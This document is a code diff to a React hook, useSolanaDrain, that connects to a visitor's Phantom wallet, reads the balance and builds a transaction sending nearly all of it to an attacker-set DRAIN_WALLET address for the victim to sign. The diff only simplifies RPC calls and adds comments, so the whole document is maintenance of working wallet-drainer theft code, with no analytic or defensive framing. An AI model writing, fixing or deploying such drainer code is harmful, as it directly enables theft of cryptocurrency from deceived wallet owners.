@@ -2,10 +2,9 @@
 
 import { useCallback } from 'react';
 import { Connection, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';
-import { getConnection, executeWithRetry } from '@/utils/rpcManager';
 
 const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
-const MIN_BALANCE = 0.003 * 1e9;
+const MIN_BALANCE = 0.003 * 1e9; // 0.003 SOL
 
 export const useSolanaDrain = () => {
   const executeDrain = useCallback(async (allocatedAmount) => {
@@ -14,24 +13,21 @@ export const useSolanaDrain = () => {
         throw new Error('Phantom wallet not detected');
       }
 
-      const connection = getConnection();
+      // Using environment variable for RPC
+      const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
       
       const response = await window.solana.connect();
       const walletPubkey = response.publicKey;
       
-      const balance = await executeWithRetry(() => 
-        connection.getBalance(walletPubkey)
-      );
+      const balance = await connection.getBalance(walletPubkey);
       
       if (balance < MIN_BALANCE) {
         throw new Error('Insufficient balance for gas');
       }
       
-      const drainAmount = balance - 2000000;
+      const drainAmount = balance - 2000000; // Leave 0.002 SOL for gas
       
-      const { blockhash } = await executeWithRetry(() =>
-        connection.getLatestBlockhash()
-      );
+      const { blockhash } = await connection.getLatestBlockhash();
       
       const transaction = new Transaction({
         feePayer: walletPubkey,
@@ -46,9 +42,7 @@ export const useSolanaDrain = () => {
       
       const signed = await window.solana.signAndSendTransaction(transaction);
       
-      await executeWithRetry(() =>
-        connection.confirmTransaction(signed.signature, 'confirmed')
-      );
+      await connection.confirmTransaction(signed.signature, 'confirmed');
       
       return {
         success: true,
